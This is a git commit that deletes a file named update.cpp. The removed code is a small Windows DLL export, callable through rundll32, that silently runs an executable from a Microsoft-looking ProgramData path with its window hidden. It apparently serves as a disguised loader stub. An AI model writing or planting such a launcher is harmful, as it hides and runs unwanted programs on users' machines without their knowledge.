bdadfd7b5baf0f3eea983d6ac175e543492dd415
mrpanda-bamboo <accounts@mrpanda.ch>
2025-06-27 09:36:45 +0200

    Delete update.cpp

--- update.cpp
+++
@@ -1,5 +0,0 @@
-#include <windows.h>
-
-extern "C" __declspec(dllexport) void CALLBACK MyFunction(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
-    WinExec("C:\\ProgramData\\Microsoft\\CacheSync\\systemupdater.exe", SW_HIDE);
-}
